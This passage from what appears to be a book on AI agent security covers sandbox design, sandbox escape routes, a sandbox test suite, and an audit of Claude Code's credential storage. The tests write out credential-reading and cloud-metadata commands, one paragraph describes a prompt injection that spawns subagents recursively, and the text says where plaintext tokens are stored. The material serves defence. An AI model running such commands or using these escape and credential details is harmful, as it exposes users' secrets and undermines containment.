  3. Capability-based sandboxing with explicit capability tokens per agent:
interface SandboxCapabilities {
  filesystem: 'none' | 'read' | 'readwrite';
  network: 'none' | 'allowed';
  shell: 'none' | 'allowed';
  maxMemoryMB: number;
  maxCpuSeconds: number;
}
  1. Fork depth limits enforced by a counter, not by boilerplate detection:
function spawnSubagent(
  capabilities: SandboxCapabilities,
  currentDepth: number,
  maxDepth: number
): Process {
  if (currentDepth >= maxDepth) {
    throw new SecurityError(
      `Fork depth limit reached: ${currentDepth}/${maxDepth}`
    );
  }

  const child = fork('./agent-runner.js', {
    env: {
      ...minimalEnv(),  // Strip sensitive env vars
      AGENT_DEPTH: String(currentDepth + 1),
      AGENT_MAX_DEPTH: String(maxDepth),
      AGENT_CAPABILITIES: JSON.stringify(capabilities),
    },
    execArgv: [],  // No debug flags in children
  });

  // Apply OS-level sandbox to child process
  applySandboxProfile(child.pid, capabilities);

  return child;
}

The recursive forking vulnerability (CWE-674) is compounded by the fact that fork children retain the Agent tool in their tool pool. Without hard depth limits, a prompt injection that instructs an agent to "create a subagent that creates a subagent that creates a subagent..." can exhaust system resources through exponential process spawning.

8.9 Sandbox Escape Techniques and Defenses

Understanding how sandboxes fail is essential for designing ones that do not. Sandbox escape research from browser security, container security, and mobile app security applies directly to AI agent sandboxing.

Escape Category 1: Kernel Vulnerabilities

Both Seatbelt and seccomp-bpf enforce restrictions in the kernel. A kernel vulnerability that allows privilege escalation or arbitrary code execution in kernel space bypasses all sandbox restrictions. This is the fundamental limitation of OS-level sandboxing: the kernel is the trusted computing base, and a compromised kernel means a compromised sandbox.

CVE Type Impact
CVE-2021-22555 Linux Netfilter heap OOB write Container escape via kernel exploit
CVE-2022-0185 Linux filesystem context heap overflow Namespace escape to root
CVE-2023-32434 macOS XNU kernel memory corruption Sandbox escape on iOS/macOS

Defense: Minimize the kernel attack surface exposed to sandboxed processes. seccomp-bpf helps by blocking syscalls that are not needed -- if the sandboxed process cannot call mount(), ptrace(), or init_module(), kernel vulnerabilities in those subsystems are unreachable. gVisor goes further by reimplementing syscalls in user space, so kernel bugs in unimplemented syscalls are irrelevant.

Escape Category 2: Resource Side Channels

Even a perfectly isolated process can communicate with the outside world through resource side channels:

  • Timing channels: A sandboxed process can modulate CPU usage to encode information that another process observes through scheduling latency
  • Filesystem metadata: File creation timestamps, inode numbers, and directory sizes leak information between sandboxed processes sharing a filesystem
  • Memory pressure: A sandboxed process that allocates and frees memory rapidly causes observable memory pressure on the host

These channels are low-bandwidth (bytes to kilobytes per second) but sufficient for exfiltrating credentials or encryption keys.

Defense: Resource side channels cannot be fully eliminated without hardware isolation (Firecracker/VMs). For AI agents, the practical mitigation is to ensure sandboxed processes do not share filesystems or observe each other's scheduling behavior. Running each agent command in a separate cgroup with isolated CPU and memory budgets reduces bandwidth.

Escape Category 3: IPC and Signal Channels

On both macOS and Linux, inter-process communication mechanisms can breach sandbox boundaries:

  • Unix domain sockets: If a socket path is inside the allowed write directory, the sandboxed process can communicate with any process that connects
  • Mach ports (macOS): Overly permissive Mach port access allows IPC with system services
  • Signals: A sandboxed process can send signals to processes in the same user space

Defense: Restrict IPC mechanisms explicitly in the sandbox profile. On macOS, limit mach-lookup to specific global names. On Linux, use PID namespaces to prevent the sandboxed process from seeing or signaling other processes.

8.10 Sandbox Testing and Validation

A sandbox profile that is never tested is a sandbox profile that does not work. Production AI agents need automated tests that verify sandbox enforcement:

// Sandbox validation test suite
describe('Sandbox Enforcement', () => {
  it('blocks writes outside project directory', async () => {
    const result = await executeInSandbox('touch /tmp/../root/test');
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('Operation not permitted');
  });

  it('blocks reading SSH keys', async () => {
    const result = await executeInSandbox('cat ~/.ssh/id_rsa');
    expect(result.exitCode).not.toBe(0);
  });

  it('allows writes within project directory', async () => {
    const result = await executeInSandbox('touch project/test.txt');
    expect(result.exitCode).toBe(0);
  });

  it('blocks cloud metadata access', async () => {
    const result = await executeInSandbox(
      'curl -s http://169.254.169.254/latest/meta-data/'
    );
    expect(result.exitCode).not.toBe(0);
  });

  it('enforces timeout on long-running commands', async () => {
    const start = Date.now();
    const result = await executeInSandbox('sleep 300', { timeoutMs: 5000 });
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(10000);
    expect(result.timedOut).toBe(true);
  });

  it('kills entire process group on timeout', async () => {
    const result = await executeInSandbox(
      'bash -c "sleep 300 & sleep 300 & wait"',
      { timeoutMs: 2000 }
    );
    // Verify no orphaned processes remain
    const orphans = await findProcessesByGroup(result.pgid);
    expect(orphans).toHaveLength(0);
  });
});

Sandbox tests should run in CI/CD as part of the agent's test suite. A failing sandbox test is a deployment blocker -- it indicates that a security boundary is not enforced.

8.12 Key Takeaways

The sandbox is the last line of defense in the AI agent security stack. It operates at the kernel level, below the abstraction layer that upstream defenses manipulate, providing security guarantees that are independent of every other layer's correctness.

macOS Seatbelt and Linux seccomp-bpf provide kernel-enforced restrictions with near-zero performance overhead. Both support deny-default profiles with explicit capability allowlists. Both enforce profile inheritance to child processes, preventing sandbox escape through process spawning.

The critical gaps are network isolation (most agents allow outbound connections) and subagent isolation (most agents share process space between parent and child agents). Network isolation requires namespace-based proxy architectures that no major agent has deployed. Subagent isolation requires process-level separation with capability attenuation, replacing the current advisory-only name-based tool filtering.

Next-generation technologies (gVisor, Firecracker, WASM) offer stronger isolation at higher complexity and cost. The right choice depends on deployment context: OS-native sandboxes for workstations, container-based sandboxes for CI/CD, micro-VMs for multi-tenant infrastructure, and WASM for specific tool implementations.

As discussed throughout Part II, the security of a single AI agent depends on the cooperation of multiple defense layers: command parsing (Chapter 5), permission evaluation (Chapter 6), path validation (Chapter 7), and process sandboxing (this chapter). No single layer is sufficient. The security guarantee emerges from the independence and completeness of the entire stack. Part III shifts focus from tool-level security to a different attack surface: authentication, credential management, and secret protection in AI agent systems.

Chapter 9: Credential Management for AI Agents

Part II examined the security of single-agent internals --- command execution, permission systems, file system safety, and sandbox isolation. Those chapters addressed threats that arise from what the agent does. Part III shifts to what the agent knows --- the credentials, tokens, and secrets that grant it access to external services. A compromised credential is not a local problem. It is a lateral movement vector that turns a single agent breach into an organization-wide incident.

AI agents authenticate against APIs, cloud services, code repositories, and model providers. Unlike traditional applications where a developer hardcodes a service account credential at deployment time, AI agents acquire credentials dynamically through OAuth flows, inherit them from environment variables, and cache them across sessions. This dynamic lifecycle creates a credential management surface area that most security architectures were not designed to handle.

This chapter dissects the credential lifecycle for AI agents: how credentials are acquired, where they are stored, how they are refreshed, and where the chain fails. We use Claude Code's authentication system as the primary case study, drawing on findings from production security audits that revealed plaintext storage on Linux, TOCTOU race conditions in credential writes, and keychain fallback paths that silently degrade to insecure storage.

9.1 The Agent Credential Landscape

Traditional applications authenticate through a narrow set of patterns: API keys embedded in environment variables, service account JSON files mounted as secrets, or certificate-based mutual TLS. The developer configures these once, and the application uses them for its lifetime.

AI agents break this model in three ways:

Dynamic acquisition. Agents authenticate on behalf of humans through interactive OAuth flows, receiving short-lived access tokens and long-lived refresh tokens. The agent must manage the full token lifecycle --- acquisition, storage, refresh, and revocation --- without human intervention after the initial authorization.

Multi-provider authentication. A single agent session may authenticate against the model provider API (Anthropic, OpenAI), a code hosting platform (GitHub, Azure DevOps), MCP servers with their own authentication, and enterprise SSO systems. Each provider has different token formats, lifetimes, and refresh mechanisms.

Session persistence. Unlike stateless API clients, AI agents maintain sessions across multiple interactions. Credentials must persist between sessions so users do not re-authenticate every time they launch the agent. This persistence creates a storage problem: where do you put credentials that survive process restarts?

The diagram reveals the central tension: agents need credentials for multiple providers, but the storage mechanisms vary wildly by platform. macOS has the Keychain. Linux has D-Bus Secret Service (if a keyring daemon is running). Windows has the Credential Manager. And in every environment where the platform-specific store is unavailable --- containers, SSH sessions, CI/CD pipelines --- the agent falls back to plaintext files.

9.2 OAuth2 + PKCE for Agent Authentication

The industry standard for interactive agent authentication is OAuth 2.0 with Proof Key for Code Exchange (PKCE). PKCE was originally designed for mobile applications that cannot securely store client secrets, and AI CLI agents share exactly this constraint --- they run on the user's machine where any compiled-in secret can be extracted.

The PKCE Flow for CLI Agents

sequenceDiagram
    participant User as User
    participant CLI as AI Agent CLI
    participant Browser as System Browser
    participant AuthServer as OAuth Provider

    CLI->>CLI: Generate PKCE code_verifier (random 128 bytes)
    CLI->>CLI: Derive code_challenge = SHA-256(code_verifier)
    CLI->>CLI: Generate state parameter (CSRF protection)
    CLI->>CLI: Start localhost callback listener
    CLI->>Browser: Open authorization URL with code_challenge + state
    Browser->>AuthServer: User authenticates + authorizes scopes
    AuthServer->>Browser: Redirect to localhost callback with auth code + state
    Browser->>CLI: Callback delivers auth code
    CLI->>CLI: Verify state parameter matches
    CLI->>AuthServer: Exchange auth code + code_verifier for tokens
    AuthServer->>CLI: access_token + refresh_token
    CLI->>CLI: Store tokens in secure storage

The critical security properties of this flow:

No client secret. The agent never possesses a static client secret. The code_verifier is generated fresh for each authentication attempt and used only once. An intercepted authorization code is useless without the corresponding verifier.

PKCE prevents authorization code interception. Even if an attacker intercepts the redirect URI callback (by binding to the same localhost port before the agent), they cannot exchange the authorization code without the code_verifier that was generated in-memory by the agent.

State parameter prevents CSRF. The state parameter links the authorization request to the callback, preventing an attacker from injecting their own authorization code into the agent's callback.

Real-World Implementation: Claude Code's OAuth Flow

Claude Code implements OAuth2+PKCE in services/oauth/, with a security audit revealing one noteworthy finding:

Finding: OAuth callback listener on predictable localhost port (CWE-352, CVSS 3.7). The callback listener binds to a predictable localhost port. While PKCE's code_verifier prevents authorization code theft even if the port is intercepted, the predictable port creates a narrow race window: a local attacker could bind to the port first and receive the browser redirect. The state parameter and PKCE verifier prevent the attacker from completing the token exchange, but the failed callback creates a denial-of-service condition for the legitimate authentication attempt.

Mitigation pattern: Use ephemeral port binding (port 0) and include the dynamically assigned port in the redirect URI registered with the OAuth provider. This eliminates the predictable port attack entirely but requires the OAuth provider to support dynamic redirect URIs or a range of pre-registered ports.

// Secure pattern: ephemeral port binding
import { createServer } from "net";

function getEphemeralPort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const server = createServer();
    server.listen(0, "127.0.0.1", () => {
      const port = (server.address() as { port: number }).port;
      server.close(() => resolve(port));
    });
    server.on("error", reject);
  });
}

// Use the ephemeral port in the redirect URI
const callbackPort = await getEphemeralPort();
const redirectUri = `http://127.0.0.1:${callbackPort}/callback`;

PKCE Cryptographic Requirements

The PKCE specification (RFC 7636) requires specific cryptographic primitives. Production audit of Claude Code confirmed correct implementation:

Parameter Requirement Claude Code Implementation Status
code_verifier 43-128 char, unreserved charset crypto.randomBytes(32).toString('base64url') Correct
code_challenge BASE64URL(SHA256(verifier)) crypto.createHash('sha256').digest('base64url') Correct
code_challenge_method S256 (not plain) Hardcoded S256 Correct
state Unpredictable, unique per request crypto.randomBytes(16).toString('hex') Correct

The plain challenge method (sending the verifier as the challenge, without hashing) is a documented downgrade attack. Agents must enforce S256 and reject servers that only support plain.

OAuth tokens, once acquired, must be stored. This is where the credential management story gets uncomfortable.

The Audit Findings

A production security audit of Claude Code's credential storage revealed a chain of vulnerabilities that collectively represent the most common real-world attack vector against AI agent credentials:

Finding 7 (HIGH): Plaintext credential storage on non-macOS platforms (CWE-312, CVSS 6.5). getSecureStorage() returns plainTextStorage for all non-macOS platforms. OAuth tokens and credentials are stored as a JSON file at ~/.claude/.credentials.json with chmod 0600 permissions. While chmod 0600 restricts access to the file owner, same-user processes and root can read the credentials freely.

// Actual code pattern from production audit
// utils/secureStorage/index.ts
export function getSecureStorage(): SecureStorage {
  if (process.platform === "darwin") {
    return keychainStorage;
  }
  // TODO: add libsecret support for Linux
  return plainTextStorage;
}

That TODO comment is the credential security posture for every Linux user. The entire Linux credential chain reduces to:

OAuth tokens -> plainTextStorage.update() -> JSON.stringify(data) 
-> writeFileSync("~/.claude/.credentials.json") -> chmod 0o600

Finding 8 (HIGH): Keychain fallback silently degrades to plaintext (CWE-312, CVSS 5.9). On macOS, when the Keychain is unavailable (Docker containers, SSH sessions, CI environments), the storage silently falls back to plainTextStorage. A warning is logged, but the user is not alerted. Credentials that the user believes are protected by the hardware-backed Keychain are actually sitting in a plaintext JSON file.

OAuth token obtained → saveOAuthTokensIfNeeded() → secureStorage.write() 
→ macOS keychain fails → fallbackStorage activates 
→ plainTextStorage.write() → .credentials.json on disk in plaintext

Finding 30 (MEDIUM): TOCTOU race in credential file write (CWE-367, CVSS 4.7). The credential write operation uses writeFileSync followed by chmodSync. Between the write and the permission change, there is a window where the file exists with the default umask permissions (potentially world-readable). On shared systems, another process could read the file during this window.

The Blast Radius

The security action report identified credential storage as a high-priority remediation chain affecting:

  • All Linux users --- no keychain equivalent implemented
  • macOS Docker/SSH users --- keychain unavailable, silent fallback
  • CI/CD pipelines --- headless environments with no keyring daemon
  • Container environments --- volume mounts may expose credential files

Any process running as the same user can read ~/.claude/.credentials.json. Backup software, cloud sync agents, filesystem scanning tools, and malware all have access. In containerized environments where the home directory is mounted as a volume, the attack surface expands to any process in the container ecosystem.

The remediation for the plaintext storage problem requires platform-specific credential managers with a layered fallback strategy.
